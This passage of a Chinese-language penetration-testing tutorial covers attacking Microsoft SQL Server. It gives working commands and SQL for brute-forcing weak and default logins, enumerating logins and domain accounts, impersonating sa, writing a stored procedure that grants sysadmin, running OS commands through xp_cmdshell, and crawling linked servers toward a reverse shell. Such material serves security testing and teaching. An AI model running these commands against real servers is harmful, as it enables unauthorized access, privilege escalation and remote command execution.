连接测试，两种功能均可用于测试。
    Get-SQLConnectionTestThreaded
    Invoke-SQLAuditWeakLoginPw 
爆破必须的几个条件：
  * 常见的弱密码 
  * 当前的本地用户访问权限 
  * 当前域用户访问权限 
  * 备用域用户访问权限 
使用msf来执行爆破
    use auxiliary/scanner/mssql/mssql_login
PowerUpSQL其他获取账户相关命令：
描述 | 命令  
---|---  
获取可用提供的SQL Server登录名登录的域SQL Server列表。 |  _.Status -like "Accessible"} $Targets  
获取可以使用当前域帐户登录的域SQL服务器的列表。 |  _.Status -like "Accessible"} $Targets  
获取可以使用备用域帐户登录的域SQL服务器的列表。 | runas /noprofile /netonly /user:domain\user
PowerShell.exe``Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
-Threads 15  
获取可以使用非域系统中的备用域帐户登录的域SQL服务器的列表。 | runas /noprofile /netonly /user:domain\user
PowerShell.exe``Get-SQLInstanceDomain -Verbose -Username 'domain\user'
-Password 'MyPassword!' -DomainController 10.1.1.1 | Get-SQLConnectionTestThreaded -Verbose -Threads 15  
发现域SQL Server，并根据实例名称确定它们是否配置有普通应用程序使用的默认密码。 | Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose  
### SQL Server权限提升
权限提升基本的一个思路：
域用户可以到处登录的前置条件。
  * 添加了域用户
  * 已添加本地用户
  * 特权继承
获得Sysadmin权限的一些利用点：
#### 获得低权限账号
可以使用常用的凭据执行爆破，但要注意帐户锁定。
以PowerUpSQL为例：
    import-module .\PowerUPSQL.psd1 //加载模块。
    Get-SQLInstanceScanUDP | Invoke-SQLAuditWeakLoginPw //从未经身份验证的用户角度发起攻击。
    Get-SQLInstanceDomain | Invoke-SQLAuditWeakLoginPw //从域用户角度开始攻击。
    Get-SQLInstanceScanUDP | Get-SQLConnectionTestThreaded -Username  -Password  //手动连接到已标识的SQL Server实例。
许多使用SQL Server Express作为后端的应用程序都是使用特定的凭据和实例名称配置的。使用以下命令检查这些凭据：
    import-module .\PowerUPSQL.psd1 //加载模块。
    Get-SQLInstanceDomain | Invoke-SQLAuditDefaultLoginPw
    Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw
如果与SQL Server的通信未加密，我们可以执行MITM攻击来注入们自己的查询。根据欺骗的用户特权，我们可以注入SQL登录名。
  * [sqlmitm.py](https://gist.github.com/anonymous/edb02df90942dc4df0e41f3cbb78660b)
#### 使用本地或域用户账号
尝试使用当前帐户登录到SQL Server。过多的登录特权是常见的配置。
    import-module .\PowerUpSQL.psd1
    Get-SQLInstanceDomain | Get-SQLConnectionTest
    Get-SQLInstanceLocal | Get-SQLConnectionTest
#### 从Public到Sysadmin
猜测弱密码获得高权限角色账号，一般需要以下两步：
  * 枚举登录名
  * 猜测密码
**1.枚举登录名**
默认情况下，Public角色成员不能选择本地列表登录，但可以进行Fuzz登录名。如果尝试枚举所有SQL
Server登录名枚举，则只会看到其中一部分。查询出所有SQL Server登录名：
    SELECT name FROM sys.syslogins
    SELECT name FROM sys.server_principals
suser_name返回给定主体ID的主体名称。可以通过使用Public角色，在suser_name函数中枚举主体ID值来标识SQL登录名。查询示例：
    SELECT SUSER_NAME(1)
    SELECT SUSER_NAME(2)
    SELECT SUSER_NAME(3)
    SELECT SUSER_NAME(4)
    ...
**2.猜测密码**
使用PowerUpSQL尝试对那些已识别出的的SQL Server登录名使用弱口令爆破。
    Get-SQLFuzzServerLogin -Instance ComputerNAme\InstanceName  //PowerUpSQL Blind SQL登录枚举
    Invoke-SQLAuditWeakLoginPw  
**3.获取当前域内用户名**
public角色可以获取当前域信息，有利用盲猜域内其他组SID或用户名。
获取SQL Server所在的域：
    SELECT DEFAULT_DOMAIN() as mydomain
获取域内用户的完整SID。
    SELECT SUSER_SID('\Domain Admins')
    0x010500000000000515000000CAAE870FA5F89ACD856A619851040000
获取域内Admins组的完整RID。
    SELECT SUSER_SID('\Domain Admins')
    0x010500000000000515000000CAAE870FA5F89ACD856A619800020000
抓取完整RID的前48个字节以获取域的SID。通过将十六进制数字值附加到先前的SID来创建新的RID（将与域对象相关联）。
    RID=0x010500000000000515000000CAAE870FA5F89ACD856A619851040000
    SELECT SUSER_NAME(RID)  //获取与RID关联的域对象名称。
PowerUpSQL也可盲猜域帐户。
    Get-SQLFuzzDomainAccount -Instance ComputerNAme\InstanceName
#### 利用Public获得更多权限
在具有对SQL Server的Public权限账号的上下文中，最常用的获取执行权限的方法是：
  * 特权模拟
  * 存储过程和触发器创建/注入
  * 写入存储过程的自动执行
  * SQL Server代理任务
  * xp_cmdshell
  * 创建数据库链接到文件或服务器
  * 导入/安装自定义CLR程序集
  * 临时查询
  * 共享服务帐户
  * 数据库链接
  * UNC路径注入
  * Python/R脚本执行。
以上大部分内容在SQL Server常用攻击面已经介绍，不再赘述，下面简单介绍一下前面未提的方法。
**1.特权模拟**
SQL
Server中有一个特权/权限，它允许权限较低的用户，模拟行使另一个具有更多访问权限的用户。不限制执行查询/命令，但必须将数据库配置为允许OS命令执行对象。
**EXECUTE AS语句**
默认情况下，会话在用户登录时开始，并在用户注销时结束。会话期间的所有操作都必须对该用户进行权限检查。当一个 **EXECUTE AS**
语句运行，会话的执行上下文切换到指定的登录名或用户名。上下文切换之后，将针对该帐户的登录名和用户安全性令牌而不是调用 **EXECUTE AS**
语句的人员检查权限。本质上，在会话或模块执行期间将模拟用户或登录帐户，或者显式还原上下文切换。
使用public角色用户testuser，手动检查是否是sa登录：
    SELECT SYSTEM_USER
    SELECT IS_SRVROLEMEMBER('sysadmin') //检查SQL Server 登录名是否为指定服务器角色的成员。
    EXECUTE AS LOGIN = 'sa'  //模拟sa数据库级别，对于服务器级别，请使用EXECUTE AS USER。
再次使用public角色用户testuser，手动检查目前模拟为sa登录：
    SELECT SYSTEM_USER
    SELECT IS_SRVROLEMEMBER('sysadmin')
**2.存储过程和触发器创建/注入**
开发人员的一个常见错误是将他们要使用的所有功能，将其写入存储过程中，以便能够在其他用户的上下文中执行。这些存储过程可以作为数据库的所有者（拥有所有者的EXECUTE
AS）来执行，以使它可以访问其他资源。也可以在高权限用户的上下文中进行执行，并且不需要授予特权。但是，从安全的角度来看，采用此方法有一些缺点：
  * 无法精细控制数据库所有者的权限。
  * 普通帐户或sysadmin帐户通常拥有数据库。
DB_OWNER角色可以使用EXECUTE AS
OWNER在sa或sysadmin帐户的上下文中执行。如果这些存储过程实现不安全，则可以通过扩展存储过程来通过SQL注入或命令注入进行模拟。例子：
    USE test2
    GO
    CREATE PROCEDURE test_imitation2
    WITH EXECUTE AS OWNER
    AS
    EXEC sp_addsrvrolemember 'testuser','sysadmin'
    GO
必须将数据库配置为值得信赖的OS命令执行程序。虽然可以通过SQL或命令注入进行模拟，但是创建存储过程或触发器是更好的选择。
攻击场景：
DBA对Web应用程序执行以下操作：
    CREATE LOGIN somebody WITH PASSWORD = 'Password123';  //为WebApp创建SQL登录名。
    USE test
    ALTER LOGIN [somebody] with default database = [test];
    CREATE USER somebody FROM LOGIN [somebody];
    EXEC sp_addrolemember [db_owner], [somebody];  //为此SQL登录名分配db_owner角色。Webapp可以从数据库访问所需的任何内容。
    ALTER DATABASE CurrentDB SET TRUSTWORTHY ON  //将数据库设置为可信任的访问外部资源。
可以在查询中识别此类数据库
    SELECT SUSER_NAME(owner_id) as DBOWNER, d.name as DATABASENAME FROM sys.server_principals r INNER JOIN sys.server_role_members m on r.principal_id = m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id inner join sys.databases d on suser_sname(d.owner_sid) = p.name WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') and r.type = 'R' and r.name = N'sysadmin'
可以使用以下metasploit模块自动进行探测
    auxiliary/admin/mssql/mssql_escalate_dbowner
    auxiliary/admin/mssql/mssql_escalate_dbowner_sqi
[更多方法可参考NetSpi博客](https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/)
**3.服务帐户**
SQL Server所有版本都为服务帐户提供sysadmin特权。
列出常见的一些服务帐户类型：
  * 域用户
  * 本地用户
  * 本地系统
  * 网络服务
  * 本地托管服务帐户
  * 域托管服务帐户
PowerUpSQL的Invoke-SQLOSCMD可用于基本命令执行。
对于单个主机实例：
    Invoke-SQLOSCMD –Verbose –Instance "server1\instance1" –Command "whoami"
对于域内实例：
    Get-SQLInstanceDomain | InvokeSQLOSCMD –Verbose –Command "whoami"
如果我们攻击了一个SQL Server，那么我们也将使用该共享帐户来攻击所有SQL Server。
**4.爬数据库链接**
数据库链接（Database Link）本质上是两个服务器之间的持久连接。数据库链接（Database
Link）的作用是，允许一个数据库服务器去对其他的数据库服务器进行查询。数据链接可以用不同的方式进行配置，但是更多时候我们看到它们使用硬编码的凭据。
Public角色使用openquery()函数，对被链接的数据库服务器进行查询；也可以执行xp_cmdshell，对远程访问也无凭证要求。通常配置此功能会使数据库服务器，拥有过多的特权。因此允许在远程服务器上的模拟登录，切换到高权限账号的上下文中。
下图简单说明当数据库对链接查询功能配置过高特权时，注入的payload是如何被传递：
列出所有链接的服务器名，通常有两个选项
`exec sp_linkedservers`和`SELECT srvname FROM master..syservers`
查询一个服务器的所有链接的服务器名：
    SELECT srvnaem From openquery(DB1, 'select srvname FROM master..sysservers')
查询一个服务器的某个链接的服务器所链接的服务器名：
    SELECT srvnaem From openquery(DB1, 'select srvname FROM openquery(HVA, "SELECT srvname FROM master..syservers")')
查询可以一直嵌套执行，直到穷尽所有数据库服务器。在链接的服务器上执行命令：
    SELECT * FROM openquery(DB1, 'SELECT * FROM openquery(HVA, "SELECT 1; exec xp_cmdshell'"'ping 192.168.1.1"" '')')
SQL Server 2005 存在链接爬网命令执行漏洞，使用msf的mssql_linkcrawler模块可获得反弹shell。
    use exploit/windows/mssql/mssql_linkcrawler
自动化爬网的工具：
  * [mssql_linkcrawler](https://www.rapid7.com/db/modules/exploit/windows/mssql/mssql_linkcrawler)
  * [PowerUpSQL](https://blog.netspi.com/sql-server-link-crawling-powerupsql/)
  * ……
#### 从系统管理员到Sysadmin
首先先了解三个点：
  * SQL Server较旧的版本为本地管理员提供sysadmin特权
  * SQL Server较旧的版本为本地系统提供sysadmin特权